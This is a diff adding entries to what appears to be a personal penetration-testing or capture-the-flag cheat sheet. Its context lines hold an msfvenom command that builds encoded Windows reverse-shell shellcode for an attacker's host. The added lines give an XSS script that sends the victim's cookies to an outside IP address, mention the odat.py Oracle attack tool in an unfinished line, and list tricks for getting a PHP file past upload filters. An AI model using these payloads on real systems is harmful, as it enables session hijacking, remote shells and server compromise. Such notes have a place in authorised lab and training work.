@@ -68,3 +68,19 @@
         3. you can click the button "->|" (except the | are dots)
 1. place shellcode
     1. `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
+
+# Oracle DB exploit tool
+- odat.py
+  - `--sysdba` to get a 
+  
+# XSS
+```
+<script>
+document.write('<img src="http://10.10.14.19/xxxx?cookie=' + document.cookie + '" />')
+</script>
+```
+
+# bypass upload file filter
+- https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf
+- jpg.php, php.jpg, php5, php6, php7
+- use system filename length limits to truncate the .png part from .php.png
